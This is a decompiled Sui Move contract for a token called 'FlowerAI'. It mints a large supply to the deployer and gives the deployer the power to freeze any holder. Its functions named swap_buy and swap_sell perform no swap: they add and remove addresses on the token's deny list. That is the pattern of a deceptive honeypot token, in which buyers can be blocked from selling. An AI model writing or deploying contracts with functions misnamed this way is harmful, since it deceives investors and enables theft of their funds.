module 0x227308b3613da17af8c5259533a335dfec59480cd6e75fde9092c2caaa905f2f::flower {
    struct FLOWER has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: FLOWER, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FLOWER>(arg0, 9, b"Flower", b"FlowerAI", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmXBz7u22ErAg9uWki2XK4gaHEc3Uri5V57VKVz6DM6ciQ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<FLOWER>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FLOWER>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<FLOWER>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<FLOWER>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FLOWER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FLOWER>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FLOWER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<FLOWER>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

